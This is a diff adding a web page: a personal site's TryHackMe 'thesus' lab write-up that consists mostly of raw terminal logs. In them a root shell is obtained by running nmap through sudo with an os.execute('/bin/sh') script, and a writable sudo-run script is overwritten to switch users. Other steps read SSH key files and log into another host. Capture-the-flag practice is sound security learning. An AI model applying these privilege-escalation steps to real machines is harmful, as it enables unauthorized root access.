@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>thesus | Technical Intelligence Labs</title>
+    <link rel="stylesheet" href="../css/custom.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .markdown-content { font-family: 'Inter', sans-serif; line-height: 1.7; color: #cbd5e1; max-width: 100%; margin: 0 auto; padding-left: 2rem; border-left: 2px solid rgba(255, 255, 255, 0.1); position: relative; }
+        .markdown-content h1 { font-size: 2.5rem; color: #fff; margin-bottom: 2rem; border-bottom: 1px solid #1e293b; padding-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h1::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 10px; height: 10px; background: #fff; border-radius: 50%; box-shadow: 0 0 10px #22c55e; border: 2px solid #0f172a; transform: translateY(-50%); }
+        .markdown-content h2 { font-size: 1.75rem; color: #f8fafc; margin-top: 3rem; margin-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h2::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 8px; height: 8px; background: #22c55e; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
+        .markdown-content h3 { font-size: 1.25rem; color: #e2e8f0; margin-top: 2rem; margin-bottom: 0.75rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h3::before { content: ''; position: absolute; left: -2.3rem; top: 50%; width: 6px; height: 6px; background: #0ea5e9; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
+        .markdown-content code { background: #1e293b; color: #22c55e; padding: 0.2rem 0.4rem; border-radius: 0.25rem; font-family: 'JetBrains Mono', monospace; }
+        .markdown-content pre { background: #1e293b; padding: 1rem; border-radius: 0.5rem; overflow-x: auto; margin-bottom: 2rem; border: 1px solid #334155; position: relative; }
+        .markdown-content pre::before { content: "CODE_BLOCK"; position: absolute; top: 0; right: 0; background: #334155; color: #cbd5e1; font-size: 0.6rem; padding: 0.2rem 0.5rem; font-family: 'JetBrains Mono', monospace; border-bottom-left-radius: 0.5rem; }
+        .markdown-content blockquote { 
+            position: relative;
+            border-left: 2px solid #22c55e; 
+            padding: 1.5rem 0 1.5rem 1.75rem; 
+            color: #cbd5e1; 
+            margin-bottom: 2.5rem; 
+            font-style: normal; 
+            background: rgba(34, 197, 94, 0.03);
+            border-radius: 0 4px 4px 0;
+            box-shadow: inset 20px 0 20px -20px rgba(34, 197, 94, 0.15);
+        }
+        .markdown-content blockquote::before {
+            content: "TECHNICAL_INTELLIGENCE";
+            position: absolute;
+            top: -9px;
+            left: 0;
+            background: #22c55e;
+            color: #000;
+            font-size: 0.6rem;
+            font-weight: bold;
+            padding: 2px 6px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .markdown-content ul { list-style-type: disc; padding-left: 1.5rem; margin-bottom: 1.5rem; }
+        .markdown-content p { margin-bottom: 1.5rem; }
+        
+        .diag-card {
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 1rem;
+            font-family: 'JetBrains Mono', monospace;
+            position: relative;
+            overflow: hidden;
+        }
+        .diag-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 2px;
+            height: 100%;
+            background: #22c55e;
+            opacity: 0.5;
+        }
+        .diag-label {
+            display: block;
+            font-size: 0.6rem;
+            text-transform: uppercase;
+            color: #64748b;
+            margin-bottom: 0.25rem;
+            letter-spacing: 0.1em;
+        }
+        .diag-value {
+            font-size: 0.9rem;
+            color: #cbd5e1;
+        }
+        .diag-blink {
+            animation: blink 1s infinite;
+        }
+        @keyframes blink { 50% { opacity: 0; } }
+    </style>
+</head>
+<body class="bg-slate-950 text-slate-200 antialiased selection:bg-accent-green selection:text-slate-900 flex flex-col min-h-screen">
+
+    <!-- Navigation -->
+    <nav class="sticky top-0 z-50 bg-slate-900/90 backdrop-blur-md border-b border-slate-700">
+        <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
+            <a href="../index.html" class="logo-container group flex items-center gap-3">
+                 <img src="../images/logo.png" alt="Logo" class="h-10 w-auto group-hover:scale-105 transition-transform duration-300">
+            </a>
+
+            <div class="hidden lg:flex items-center gap-8 font-mono text-sm">
+                <a href="../index.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Home</a>
+                <a href="../about.html" class="text-slate-400 hover:text-accent-cyan transition-colors">About</a>
+                <a href="../devhub.html" class="text-slate-400 hover:text-accent-cyan transition-colors">DevHub</a>
+                <a href="../projects.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Projects</a>
+                <a href="../writeups.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Write-ups</a>
+                <a href="../certificates.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Certs</a>
+                <a href="../contact.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Contact</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="py-20 px-6 max-w-7xl mx-auto flex-grow w-full">
+        <!-- Post Header -->
+        <header class="mb-12 border-b border-slate-800 pb-12">
+            <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
+                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">tryhackme</span>
+                <span>// 2026-01-05</span>
+                <span>// ID: REF-thesus</span>
+            </div>
+            
+            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">thesus</h1>
+            
+            <div class="flex flex-wrap gap-2">
+                <!-- Tags populated by python -->
+                <!-- tryhackme -->
+            </div>
+        </header>
+
+        <!-- Markdown Body -->
+        <div class="markdown-content">
+            <hr />
+<pre class="codehilite"><code>minos@Minos:~$ sudo -l
+Matching Defaults entries for minos on Minos:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User minos may run the following commands on Minos:
+    (root) NOPASSWD: /usr/bin/nmap
+minos@Minos:~$ TF=$(mktemp)
+minos@Minos:~$ echo 'os.execute(&quot;/bin/sh&quot;)' &gt; $TF
+minos@Minos:~$ sudo nmap --script=$TF
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2026-01-01 00:50 UTC
+NSE: Warning: Loading '/tmp/tmp.UU714afSBE' -- the recommended file extension is '.nse'.
+# uid=0(root) gid=0(root) groups=0(root)
+# /bin/sh: 2: cd: can't cd to root
+# # # # # # # # 
+# Crete_Shores  Minos_Flag
+# Crete_Shores  Minos_Flag
+# # # 
+# /bin/sh: 14: cd: can't cd to cd
+# # # # # 
+# 
+# 
+# uid=0(root) gid=0(root) groups=0(root)
+# root
+# # uid=0(root) gid=0(root) groups=0(root)
+# bin  boot  dev        etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var
+# # dear_mr_SUID  minotaur
+# /bin/sh: 26: cd: can't cd to minotaur
+# /bin/sh: 27: cd: can't cd to dear_mr_SUID
+# /bin/sh: 28: LS: not found
+# total 13
+drwx------  5 root root   10 Aug 20  2020 .
+drwxr-xr-x 22 root root   22 Aug  3  2020 ..
+lrwxrwxrwx  1 root root    9 Aug  3  2020 .bash_history -&gt; /dev/null
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  3 root root    4 Aug  3  2020 .cache
+drwx------  3 root root    3 Aug  3  2020 .gnupg
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+drwx------  2 root root    4 Aug  3  2020 .ssh
+-rw-r--r--  1 root root 2866 Aug  4  2020 dear_mr_SUID
+-rw-r--r--  1 root root  912 Aug  4  2020 minotaur
+# 
+       -&quot;&quot;\
+    .-&quot;  .`)     (
+   j   .'_+     :[                )      .^--..
+  i    -&quot;       |l                ].    /      i
+ ,&quot; .:j         `8o  _,,+.,.--,   d|   `:::;    b
+ i  :'|          &quot;88p;.  (-.&quot;_&quot;-.oP        \.   :
+ ; .  (            &gt;,%%%   f),):8&quot;          \:'  i
+i  :: j          ,;%%%:; ; ; i:%%%.,        i.   `.
+i  `: ( ____  ,-::::::' ::j  [:```          [8:   )
+&lt;  ..``'::::8888oooooo.  :(jj(,;,,,         [8::  &lt;
+`. ``:.      oo.8888888888:;%%%8o.::.+888+o.:`:'  |
+ `.   `        `o`88888888b`%%%%%88&lt; Y888P&quot;&quot;'-    ;
+   &quot;`---`.       Y`888888888;;.,&quot;888b.&quot;&quot;&quot;..::::'-'
+          &quot;-....  b`8888888:::::.`8888._::-&quot;
+             `:::. `:::::O:::::::.`%%'|
+              `.      &quot;``::::::''    .'
+                `.                   &lt;
+                  +:         `:   -';
+                   `:         : .::/
+                    ;+_  :::. :..;;;       
+                    ;;;;,;;;;;;;;,;;
+
+# # /bin/sh: 32cat: not found
+# /bin/sh: 33: CD: not found
+# /bin/sh: 34: ID: not found
+# dear_mr_SUID  minotaur
+#                  _.                              _______
+           __.--'  |             ____...,---'''''     .'''-.
+       _,-'        \ ____...--'''                     | '   '-._
+    ,-'             |                                 |  \      -.
+ ,-'                '                                 |   '       `\
+|                    \                               .'    '   _,._/
+|                     \                              |      '  \
+|                     \                              |       \  '
+||                     \                             |        \&lt;
+|\                      \                           |          \|
+|'.                     \                           /           |
+| |                      \                         |            '
+| '.                      |                  ____,..             \
+|  |                       \__,...-----''''''       `.            |
+|  '.                      \                          \           '
+|   |                       \                          `           \
+|   '                        \                          `           |
+|    |                        \                          \          \
+|    '.                       '                           \          \
+|     \                        \                           \       _,|
+|      |                        \                           \ _,.--  |
+|      '.                        ,                       _,.-'       |
+'       \                  _,.-''                 __.,-''            |
+ |       |             _.-'                _,.,--'                   |
+ \        \        _.-'           __,.,--''                          |
+ '        `.    ,-'      __..---''                                   |
+ '         \ ,-'___..,--'                                            '
+  \         -'''                                                     |
+   .        |                                                       ,
+    |       |                                                       |
+    '       |                                                       |
+     \      |                                                       |
+      \     |                                                       |
+       \    |                                                 __,.-''
+        \   |                                        __,..-''
+         \  |                              ___..--'''        
+          \ |                     ___,.--''
+           \|        ____...,--'''
+            '_..,--''
+
+Looks like you've exploited the nmap SUID.
+
+Here's an empty box for the effort!
+
+Perhaps checking the network information
+and using the SUID based binary to look 
+for other things to use that information
+on that you should have got earlier.
+
+Perhaps reading the story as you progress 
+will help you, Good luck hero!
+</code></pre>
+
+<pre class="codehilite"><code>entrance@Labyrinth:/home$ sudo -l
+Matching Defaults entries for entrance on Labyrinth:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User entrance may run the following commands on Labyrinth:
+    (minotaur) NOPASSWD: /home/entrance/labyrinth
+
+minotaur@Labyrinth:/home/minotaur$ ls -ld /home/entrance
+drwxr-xr-x 5 entrance entrance 13 Jan  1 02:40 /home/entrance
+minotaur@Labyrinth:/home/minotaur$ ls -l /home/entrance/labyrinth
+-rwxrwxr-x 1 entrance entrance 22 Jan  1 02:42 /home/entrance/labyrinth
+minotaur@Labyrinth:/home/minotaur$ 
+
+echo '#!/bin/bash' &gt; /home/entrance/labyrinth
+echo &quot;/bin/bash&quot; &gt;&gt; /home/entrance/labyrinth
+echo '/bin/bash' &gt;&gt; /home/entrance/labyrinth
+
+chmod +x /home/entrance/labyrinth
+sudo -u minotaur /home/entrance/labyrinth
+
+echo -e '#!/bin/bash\n/bin/bash' &gt; /home/entrance/labyrinth
+chmod +x /home/entrance/labyrinth
+
+sudo -u minotaur /home/entrance/labyrinth
+id
+
+entrance@Labyrinth:/home$ sudo -u minotaur /home/entrance/labyrinth
+minotaur@Labyrinth:/home$ id
+uid=1002(minotaur) gid=1002(minotaur) groups=1002(minotaur)
+minotaur@Labyrinth:/home$ ls
+ariadne  entrance  minotaur
+minotaur@Labyrinth:/home$ cd minotaur
+minotaur@Labyrinth:/home/minotaur$ ls
+Labyrinth_Flag  Minotaur  ariadne  thread
+minotaur@Labyrinth:/home/minotaur$ cat Labyrinth_Flag
+
+
+minotaur@Labyrinth:/home/minotaur$ sudo -l
+Matching Defaults entries for minotaur on Labyrinth:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User minotaur may run the following commands on Labyrinth:
+    (ariadne) NOPASSWD: /home/minotaur/thread
+minotaur@Labyrinth:/home/minotaur$ cd /home/minotaur/
+minotaur@Labyrinth:/home/minotaur$ ls -la
+total 18
+drwxr-xr-x 5 minotaur minotaur   13 Aug 20  2020 .
+drwxr-xr-x 5 root     root        5 Aug  3  2020 ..
+lrwxrwxrwx 1 root     root        9 Aug  3  2020 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 minotaur minotaur  220 Aug  3  2020 .bash_logout
+-rw-r--r-- 1 minotaur minotaur 3771 Aug  3  2020 .bashrc
+drwx------ 3 minotaur minotaur    3 Aug  3  2020 .gnupg
+drwxrwxr-x 3 minotaur minotaur    3 Aug  3  2020 .local
+-rw-r--r-- 1 minotaur minotaur  807 Aug  3  2020 .profile
+drwx------ 2 minotaur minotaur    5 Aug  4  2020 .ssh
+-rwxr----- 1 minotaur minotaur   38 Aug  3  2020 Labyrinth_Flag
+-rwxr----- 1 minotaur minotaur 1445 Aug 20  2020 Minotaur
+-rwxr----- 1 ariadne  ariadne    37 Aug  4  2020 ariadne
+-rwxr-xr-x 1 minotaur minotaur 8688 Aug  4  2020 thread
+minotaur@Labyrinth:/home/minotaur$ file thread
+thread: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=66742fe34842823ac968336a34a14a63d5e6df5f, not stripped
+minotaur@Labyrinth:/home/minotaur$
+</code></pre>
+
+<pre class="codehilite"><code>Minotaur_Flag  TheReturn  ariadne  final.jpg  jpeg_body.bin  jpeg_header.bin
+ariadne@Labyrinth:/home/ariadne$ ssh Shore@10.71.235.37
+The authenticity of host '10.71.235.37 (10.71.235.37)' can't be established.
+ECDSA key fingerprint is SHA256:LVTZvTVUM/c+/qVDbAvdKwSUcs5oCl+QCjMArUiYhAQ.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '10.71.235.37' (ECDSA) to the list of known hosts.
+Shore@10.71.235.37's password: 
+
+Permission denied, please try again.
+Shore@10.71.235.37's password: 
+
+Permission denied, please try again.
+Shore@10.71.235.37's password: 
+
+Shore@10.71.235.37: Permission denied (publickey,password).
+ariadne@Labyrinth:/home/ariadne$ 
+ariadne@Labyrinth:/home/ariadne$ cd ..
+ariadne@Labyrinth:/home$ ls
+ariadne  entrance  minotaur
+ariadne@Labyrinth:/home$ ls -la
+total 7
+drwxr-xr-x  5 root     root      5 Aug  3  2020 .
+drwxr-xr-x 22 root     root     22 Jul 29  2020 ..
+drwxr-xr-x  4 ariadne  ariadne  14 Jan  1 03:26 ariadne
+drwxr-xr-x  5 entrance entrance 13 Jan  1 02:40 entrance
+drwxr-xr-x  5 minotaur minotaur 14 Jan  1 03:14 minotaur
+ariadne@Labyrinth:/home$ cd ariadne
+ariadne@Labyrinth:/home/ariadne$ ls -la
+total 102
+drwxr-xr-x 4 ariadne ariadne    14 Jan  1 03:26 .
+drwxr-xr-x 5 root    root        5 Aug  3  2020 ..
+lrwxrwxrwx 1 root    root        9 Aug  3  2020 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 ariadne ariadne   220 Aug  3  2020 .bash_logout
+-rw-r--r-- 1 ariadne ariadne  3771 Aug  3  2020 .bashrc
+drwx------ 3 ariadne ariadne     3 Aug  3  2020 .gnupg
+-rw-r--r-- 1 ariadne ariadne   807 Aug  3  2020 .profile
+drwx------ 2 ariadne ariadne     5 Aug  4  2020 .ssh
+-rwxr----- 1 ariadne ariadne    38 Aug  3  2020 Minotaur_Flag
+-rwxr----- 1 ariadne ariadne   689 Aug 20  2020 TheReturn
+-rw-r--r-- 1 ariadne ariadne 29720 Aug 20  2020 ariadne
+-rw-r--r-- 1 ariadne ariadne 29720 Jan  1 03:26 final.jpg
+-rw-r--r-- 1 ariadne ariadne 29700 Jan  1 03:26 jpeg_body.bin
+-rw-r--r-- 1 ariadne ariadne    20 Jan  1 03:26 jpeg_header.bin
+ariadne@Labyrinth:/home/ariadne$ cd .ssh
+ariadne@Labyrinth:/home/ariadne/.ssh$ ls -la
+total 7
+drwx------ 2 ariadne ariadne    5 Aug  4  2020 .
+drwxr-xr-x 4 ariadne ariadne   14 Jan  1 03:26 ..
+-rw------- 1 ariadne ariadne 1679 Aug  3  2020 id_rsa
+-rw------- 1 ariadne ariadne  399 Aug  3  2020 id_rsa.pub
+-rw-r--r-- 1 ariadne ariadne  444 Jan  1 03:33 known_hosts
+ariadne@Labyrinth:/home/ariadne/.ssh$ cat known_hosts
+|1|R88uaNRrE9cqD0Ou2KdWXzayG6E=|PBesDIm0gzmr9n3WJrGtY0Rsofg= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEE4dTpUgFM9GZvckN8/RQFwHQgYE1HL3TK7OlvV3BlmoPyrC4WB9Ib3BR45Os22jStHYr/tWPh/4IWc3td7DRw=
+|1|opaMgWGBGwKAYZhnX4pM2JMA+Ck=|bMPoqMpe3qzGgWONOmrWs09HWNI= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGy/yjIbzS3kTHnzuzS7lbDjQAOpQDYw7883aFvYqH1q32nBci9bPAoJ1TwXaqhSu+B7oRChOQzlbDs9hk4SNsw=
+ariadne@Labyrinth:/home/ariadne/.ssh$  ssh shore@10.71.235.37
+shore@10.71.235.37's password: 
+#############################################################################
+#(@@@@)                    (#########)                   (@@@@@@@@(@@@@@@@@@#
+#@@@@@@)___                 (####)~~~   /\                ~~(@@@@@@@(@@@@@@@#
+#@@@@@@@@@@)                 ~~~~      /::~-__               ~~~(@@@@@@@@)~~#
+#@@@)~~~~~~                           /::::::/\                  ~~(@@@@)   #
+#~~~                              O  /::::::/::~--,                 ~~~~    #
+#                                 | /:::::/::::::/{                         #
+#                 |\              |/::::/::::::/:::|                        #
+#                |:/~\           ||:::/:::::/::::::|                        #
+#               |,/:::\          ||/'::: /::::::::::|                       #
+#              |#__--~~\        |'#::,,/::::::::: __|   ,,'`,               #
+#             |__# :::::\       |-#&quot;&quot;:::::::__--~~::| ,'     ',     ,,      #
+#,    ,,     |____#~~~--\,'',.  |_#____---~~:::::::::|         ',','  ',    #
+# '.,'  '.,,'|::::##~~~--\    `,||#|::::::_____----~~~|         ,,,     '.''#
+#____________'----###__:::\_____||#|--~~~~::::: ____--~______,,''___________#
+#^^^  ^^^^^   |#######\~~~^^O, | ### __-----~~~~_____########'  ^^^^  ^^^   #
+#,^^^^^','^^^^,|#########\_||\__O###~_######___###########;' ^^^^  ^^^   ^^ #
+#^^/\/^^^^/\/\^^|#######################################;'/\/\/^^^/\/^^^/\/^#
+#   /\/\/\/\/\  /\|####################################'      /\/\/\/\/\    #
+#\/\/\     /\/\/\  /\/\/\/\    /\/\/\/\/\   /\/\/\    /\/\/\/\      /\/\/\/\#
+#spb\/\/\    /\/\/\/\    /\/\/\/\    /\/\/\/\   /\/\/\/\    /\/\/\/\/\      #
+#############################################################################
+shore@Athens:~$ ls
+Athens_flag  BlackSails
+shore@Athens:~$ cat Athens_flag
+ ____ ____ ____ ____ ____ ____ ____ 
+||T |||h |||e |||s |||e |||u |||s ||
+||__|||__|||__|||__|||__|||__|||__||
+|/__\|/__\|/__\|/__\|/__\|/__\|/__\|
+
+You've survived your journey      O
+and made it safely back to     ,-.|____________________
+Crete, but your adventures   O==+-|(&gt;-------- --  -     .&gt;
+have only just begun, soon     `- |&quot;&quot;&quot;&quot;&quot;&quot;&quot;d88b&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
+there will be many more foes     | O     d8P 88b
+to face and many more heros      |  \    88= ,=88
+to recount.                      |   )   9b _. 88b
+                                 `._ `.   8`--'888
+                                  |    \--'\   `-8___
+                                  \`-.              \
+                                   `. \ -       _ / &lt;
+                                     \ `---   ___/|_-\
+Until next time brave hero.           |._      _. |_-|
+                                      \  _     _  /.-\
+                                       | -! . !- ||   |
+                                       \ &quot;| ! |&quot; /\   |
+                                        =oO)X(Oo=  \  /
+                                        888888888   &lt; \
+                                       d888888888b  \_/ 
+                                       88888888888
+</code></pre>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="py-16 text-center border-t border-slate-800 bg-transparent mt-24 relative overflow-hidden">
+        <div class="max-w-7xl mx-auto px-6 grid grid-cols-2 md:grid-cols-4 gap-4 mb-12">
+            <div class="diag-card text-left">
+                <span class="diag-label">Access_Level</span>
+                <span class="diag-value">OMNI_READ_ONLY</span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">Encryption</span>
+                <span class="diag-value">AES-256-GCM<span class="diag-blink">_</span></span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">Signal_Strength</span>
+                <span class="diag-value text-blue-400">PURE_DATA_STREAM</span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">System_Status</span>
+                <span class="diag-value">STABLE_HARDENED</span>
+            </div>
+        </div>
+
+        <div class="flex justify-center gap-6 mb-8">
+            <a href="https://github.com/kalialucard" target="_blank"
+                class="text-slate-400 hover:text-white transition-colors text-2xl" aria-label="GitHub"><i
+                    class="fa-brands fa-github"></i></a>
+            <a href="https://tryhackme.com/p/kalialucard" target="_blank"
+                class="text-slate-400 hover:text-red-500 transition-colors text-2xl" aria-label="TryHackMe"
+                title="TryHackMe"><i class="fa-solid fa-fire"></i></a>
+            <a href="https://app.hackthebox.com/profile/2503089" target="_blank"
+                class="text-slate-400 hover:text-green-400 transition-colors text-2xl" aria-label="HackTheBox"
+                title="HackTheBox"><i class="fa-solid fa-cube"></i></a>
+        </div>
+        <p class="font-mono text-[10px] text-slate-600 uppercase tracking-widest text-center">Powered by kalialucard</p>
+    </footer>
+
+    <script src="../js/main.js"></script>
+</body>
+</html>
